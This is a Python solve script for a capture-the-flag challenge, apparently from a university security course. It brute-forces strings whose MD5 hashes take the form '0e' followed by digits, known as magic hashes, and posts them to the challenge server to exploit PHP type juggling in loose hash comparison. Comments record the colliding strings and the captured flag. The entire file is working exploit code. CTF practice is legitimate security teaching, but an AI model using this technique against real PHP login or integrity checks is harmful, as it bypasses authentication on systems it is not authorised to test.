import hashlib
import requests
import re
import string

IP = 'http://ctf99.cs.ui.ac.id:9003/'
a = "CS"
b = "UI"

pattern = '0+e[0-9]*$'

CHARACTERS = string.printable[:-6]
CHARACTERS_NUMBER = len(CHARACTERS)


def character_to_index(char):
    return CHARACTERS.index(char)


def index_to_character(index):
    return CHARACTERS[index]


test = []
print(test)
# bruteforce find md5 for 'CS'
while not re.match(pattern, hashlib.md5((a + "".join(test)).encode('utf-8')).hexdigest()):
    if len(test) <= 0:
        test.append(index_to_character(0))
    else:
        overflow = True
        index = len(test) - 1
        while overflow:
            test[index] = index_to_character((character_to_index(test[index]) + 1) % CHARACTERS_NUMBER)
            if test[index] == index_to_character(0):
                if index > 0:
                    index -= 1
                else:
                    test.append(index_to_character(0))
                    overflow = False
            else:
                overflow = False
print(f"{bytes(a + ''.join(test), 'utf-8')}: {hashlib.md5((a + ''.join(test)).encode('utf-8')).hexdigest()}")
a = a + "".join(test)

test = []
while not re.match(pattern, hashlib.md5((b + ''.join(test)).encode('utf-8')).hexdigest()):
    if len(test) <= 0:
        test.append(index_to_character(0))
    else:
        overflow = True
        index = len(test) - 1
        while overflow:
            test[index] = index_to_character((character_to_index(test[index]) + 1) % CHARACTERS_NUMBER)
            if test[index] == index_to_character(0):
                if index > 0:
                    index -= 1
                else:
                    test.append(index_to_character(0))
                    overflow = False
            else:
                overflow = False
print(f"{bytes(b + ''.join(test), 'utf-8')}: {hashlib.md5((b + ''.join(test)).encode('utf-8')).hexdigest()}")
b = b + "".join(test)

params = {
    'a': bytes(a, 'utf-8'),
    'b': bytes(b, 'utf-8')
}
print(params)
response = requests.post(IP, params=params)
# b'CS1mD9;': 0e201679145060316688236973951858
# b'UI)~Y{': 0e980133055567337967434658994367
# {'a': b'CS1mD9;', 'b': b'UI)~Y{'}
# CSCE604258{PhP_type_ju66ling__4nD_maG1c_hashes}
print(response.text)
